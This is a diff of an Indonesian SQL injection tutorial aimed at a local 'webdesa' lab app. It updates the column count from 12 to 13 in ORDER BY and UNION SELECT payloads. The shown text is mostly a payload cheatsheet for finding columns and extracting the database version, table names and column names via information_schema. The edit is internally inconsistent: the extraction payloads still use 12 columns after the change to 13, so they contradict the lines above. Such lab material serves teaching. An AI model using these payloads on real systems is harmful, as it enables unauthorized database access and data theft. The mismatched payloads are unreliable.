@@ -61,12 +61,12 @@ Comment SQL (-- -) menghapus sisanya:
 | 5 | Repeater | Send → response normal (data tidak ditemukan) |
 | 6 | Repeater | Naikkan: `ORDER BY 2`, `ORDER BY 3`, ... sampai error |
 
-**Hasil:** Error di `ORDER BY 13` → **12 kolom**.
+**Hasil:** Error di `ORDER BY 14` → **13 kolom**.
 
 ### Step 2: Identifikasi Kolom yang Tampil
 ```
 Payload:
-nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 
 Response:
 Tampilkan angka 1, 2, 3, dst.
@@ -180,7 +180,7 @@ Burp Intruder:
 
 Browser langsung:
 ```
-http://localhost/webdesa/admin/warga.php?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+http://localhost/webdesa/admin/warga.php?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 Burp Intruder untuk fuzzing:
@@ -275,8 +275,8 @@ admin'/*
 ### Payload Cheatsheet
 
 ```
-ORDER BY:  ' ORDER BY 12-- -
-UNION:     ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+ORDER BY:  ' ORDER BY 13-- -
+UNION:     ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 VERSION:   ' UNION SELECT 1,version(),3,database(),5,6,7,8,9,10,11,12-- -
 TABLES:    ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema=database()-- -
 COLUMNS:   ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
